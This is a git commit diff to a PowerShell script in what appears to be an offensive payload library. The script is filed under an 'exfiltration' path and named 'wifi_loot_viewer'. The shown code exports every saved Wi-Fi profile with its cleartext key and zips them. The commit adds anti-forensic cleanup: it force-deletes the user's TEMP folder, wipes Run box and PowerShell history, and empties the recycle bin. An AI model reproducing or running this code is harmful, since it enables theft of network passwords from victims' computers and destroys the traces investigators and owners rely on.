ff535d539a77e5370e5b9d04f4a64f9740573ee3
f3bandit <f3bandit@gmail.com>
2026-04-09 23:06:55 -0400

    Update magic.ps1
    updated cleanup

--- library/user/exfiltration/wifi_loot_viewer/magic.ps1
+++ library/user/exfiltration/wifi_loot_viewer/magic.ps1
@@ -6,8 +6,14 @@ netsh wlan export profile key=clear folder="$env:TEMP\wifi"
 
 Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force
 
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
+# Empty recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
